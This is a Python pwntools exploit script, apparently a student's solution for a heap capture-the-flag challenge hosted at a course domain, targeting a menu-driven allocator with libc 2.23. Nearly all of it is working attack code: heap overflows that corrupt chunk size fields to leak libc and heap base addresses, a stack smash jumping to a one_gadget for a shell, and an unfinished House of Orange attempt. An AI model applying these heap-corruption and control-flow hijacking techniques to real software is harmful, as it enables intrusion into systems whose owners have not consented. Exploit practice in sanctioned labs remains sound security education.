#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-allocate-1.chals.io", 443, ssl=True, sni="cse4850-allocate-1.chals.io")
    else:
        return process(binary)

def create(p,index,data):
    p.recvuntil(b"Choice >>>")
    p.sendline(b"1")
    p.recvuntil(b"use [0-9] >>>")
    p.sendline(index)
    p.recvuntil(b"details >>>")
    p.sendline(data)

def edit(p,index,data):
    p.recvuntil(b"Choice >>>")
    p.sendline(b"2")
    p.recvuntil(b"edit [0-9] >>>")
    p.sendline(index)
    p.recvuntil(b"details >>>")
    p.sendline(data)

def delete(p,index):
    p.recvuntil(b"Choice >>>")
    p.sendline(b"3")
    p.recvuntil(b"delete [0-9] >>>")
    p.sendline(index)

def view(p,index):
    p.recvuntil(b"Choice >>>")
    p.sendline(b"4")
    p.recvuntil(b"view [0-9] >>>")
    p.sendline(index)

def leak_libc(p,e,l):
    # Free the second chunk and read the bk 
    create(p, b"0", b"A" * 0x88)
    create(p, b"1", b"B" * 0x78 + p64(0x31) * 2)
    create(p, b"2", p64(0xdeadbeef) + p64(0xcafebabe) + b"C" * 0x78)
    delete(p, b"1")
    edit(p, b"0", b"A" * 0x88 + p64(0x93))
    create(p, b"1", b"A"*8)
    view(p, b"1")
    
    p.recvuntil(b"AAAAAAAA")
    leak = u64(p.recv(6).ljust(8, b"\x00"))
    libc_base = leak - 0x3c4b0a
    l.address = libc_base
    log.info(f"Leaked libc base {hex(libc_base)} from main arena")
    log.info(f"Leaked libc address {hex(leak)} from main arena")

def leak_heap(p,e,l):
    # For this one free two chunks in the unsorted bin and read the bk 
    create(p, b"3", b"D" * 0x88)
    create(p, b"4", b"E" * 0x88)
    delete(p, b"3")
    delete(p, b"0")
    edit(p, b"2", b"C" * 0x88 + p64(0x93))
    create(p, b"3", b"D" * 8)
    view(p, b"3") 

    p.recvuntil(b"DDDDDDDD")
    heap_base = u64(p.recv(6).ljust(8, b"\x00")) - 0xa

    create(p, b"0", b"A" * 0x88)

    log.info(f"Leaked heap {hex(heap_base)}")
    # Clear freed chunk sizes
    edit(p, b"0", b"A" * 0x88 + p64(0x91))
    edit(p, b"2", b"C" * 0x88 + p64(0x91))
    return heap_base


def stack_smash(p,e,l):
    one_gadget = p64(l.address + 0x45216)
    pad = b"A" * 60 
    p.sendline(pad+one_gadget)
    p.interactive()



# Function to get control of a chunks fd and bk
# Attempt at a house of orange
def unsorted_attack(p,e,l,h):
    edit(p, b"0", b"A" * 0x88 + p64(0x101))
    edit(p, b"2", b"C" * 0x68 + p64(0x91))
    edit(p, b"3", b"D" * 0x68 + p64(0x91))
    edit(p, b"4", b"E" * 0x68 + p64(0x21))
    # overwrite top chunk size field to be smaller than our requested memory
    edit(p, b"4", b"E" * 0x88 + p64(0x1000 - 0x90 + 0x1))
    # trigger top chunk extension
    p.interactive()


def fsop(p,e,l,h):
    return None

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc-2.23.so")

    leak_libc(p,e,l)
    heap_leak = leak_heap(p,e,l)
    #unsorted_attack(p,e,l,heap_leak)

